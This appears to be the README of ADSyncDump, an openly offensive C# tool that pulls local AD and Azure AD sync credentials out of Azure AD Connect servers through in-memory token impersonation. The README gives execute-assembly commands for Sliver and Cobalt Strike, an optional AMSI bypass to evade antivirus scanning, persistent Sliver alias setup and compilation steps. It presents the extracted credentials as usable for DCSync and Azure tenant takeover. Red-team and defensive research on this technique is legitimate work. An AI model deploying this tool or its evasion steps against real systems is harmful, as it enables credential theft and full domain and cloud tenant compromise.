# ADSyncDump
**Language**: **English** | [中文](docs/README.zh-CN.md) | [Français](docs/README.fr.md)
<img align="right" src="assets/ADSyncDump-Logo.png" alt="ADSyncDump Logo" width="220">

C# in-memory credential extractor for Azure AD Connect servers. Extracts both local Active Directory and Azure Active Directory sync credentials without spawning child processes.

<p>
  <img src="https://img.shields.io/badge/platform-Windows-blue" alt="Platform">
  <img src="https://img.shields.io/badge/language-C%23-239120" alt="Language">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License"></a>
</p>

<br clear="right">

## Features
- Extract local AD sync account credentials (MSOL_* user with DCSync/Directory Replication rights)
- Extract Azure AD sync account credentials (Global Admin equivalent for Azure tenant takeover)
- In-memory decryption via ADSync service token impersonation, no PowerShell/child process
- Optional AMSI bypass (disabled by default)
- Auto-detect LocalDB instances, supports all AD Connect versions (v1/v2/v3)
- Auto-locate service process via Service Control Manager
- Structured execution logging
- C# 5 compatible, compiles with system csc.exe, no external dependencies
- Works with C2 execute-assembly (Sliver, Cobalt Strike, etc.)

## Usage
```
# Default (no AMSI bypass)
execute-assembly ADSyncDump.exe -p notepad.exe

# With AMSI bypass
execute-assembly ADSyncDump.exe -p notepad.exe -- --bypass-amsi
```

Does reflective in-memory loading via `execute-assembly` automatically bypass AMSI? [See details](TECHNICAL_DETAILS.md#q-does-reflective-in-memory-loading-via-execute-assembly-automatically-bypass-amsi).

### Sliver C2 Persistent Alias
You can register ADSyncDump as a persistent Sliver alias so it is available as `adsyncdump` across sessions without re-uploading the binary each time.

1. Create the alias directory and drop in the binary:
```
mkdir -p ~/.sliver-client/aliases/adsyncdump
cp ADSyncDump.exe ~/.sliver-client/aliases/adsyncdump/
```

2. Create `alias.json` in the same directory:
```json
{
  "name": "ADSyncDump",
  "version": "v0.8.1",
  "command_name": "adsyncdump",
  "original_author": "RedteamNotes",
  "repo_url": "https://github.com/RedteamNotes/ADSyncDump",
  "help": "Extract AD and Azure AD credentials from AD Connect servers",
  "long_help": "ADSyncDump extracts both local AD and Azure AD sync credentials from Azure AD Connect servers via in-memory service token impersonation. Use --bypass-amsi to enable AMSI bypass.",
  "entrypoint": "Main",
  "allow_args": true,
  "default_args": "",
  "is_reflective": false,
  "is_assembly": true,
  "files": [
    {
      "os": "windows",
      "arch": "amd64",
      "path": "ADSyncDump.exe"
    }
  ]
}
```

3. Load and verify:
```
[sliver] > aliases load ~/.sliver-client/aliases/adsyncdump/alias.json
[*] ADSyncDump alias has been loaded

[sliver] (SESSION) > adsyncdump --bypass-amsi
```

After loading, `adsyncdump <args>` is equivalent to `execute-assembly ADSyncDump.exe -p notepad.exe <args>`. The alias persists across Sliver client restarts once loaded. Upgrade by replacing the binary in the alias directory.

### Parameters
| Parameter | Description |
|-----------|-------------|
| `--bypass-amsi` | Enable in-memory AMSI patch |

## Output
Two sets of credentials are returned:
1. Local AD: MSOL_* account with domain replication rights, usable for DCSync
2. Azure AD: Sync service account with Global Admin equivalent rights, usable for Azure tenant takeover

## Build
### Requirements
- **Windows only**: Compilation requires the system .NET Framework C# compiler. Linux/MacOS compilation is not supported (the tool targets Windows exclusively, depends on Win32 APIs and Windows-only components including LocalDB and mcrypt.dll).
- .NET Framework 4.8 (preinstalled on Windows 10 1903+, Windows Server 2016+). No Visual Studio or additional SDK required.
- Must compile as x64: AD Connect runs as a 64-bit process, 32-bit builds will fail to access LocalDB and perform token impersonation.

### One-click build
Run `build.bat` directly on Windows. The script will automatically locate the system csc.exe compiler and produce a working x64 binary.

### Manual compilation
Run the following command in Command Prompt or PowerShell:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /target:exe /out:ADSyncDump.exe ADSyncDump.cs
```

### Compilation notes
- No external dependencies or NuGet packages are required. All used assemblies are built into the default .NET Framework 4.x installation.
- Precompiled x64 binaries are available in [Releases](https://github.com/RedteamNotes/ADSyncDump/releases) for direct use without compilation.
- Do not compile with .NET Core/.NET 5+, the binary must target .NET Framework 4.x to run on AD Connect servers without additional runtime dependencies.

## Notes
- Requires local administrator privileges on the AD Connect server
- All decryption happens in memory, no child processes are spawned
- Tested on Windows Server 2016/2019/2022 with AD Connect v1/v2/v3

## Version History
### v0.8.1
- Initial public release
- Local AD + Azure AD credential extraction
- Token impersonation in-memory decryption
- Optional AMSI bypass
- Auto-detect DB instances and service PID

## Additional Documentation
- [Technical Deep Dive](./TECHNICAL_DETAILS.md) - Complete breakdown of underlying architecture, cryptographic principles, implementation decisions, OpSec considerations, and failure mode resolutions.
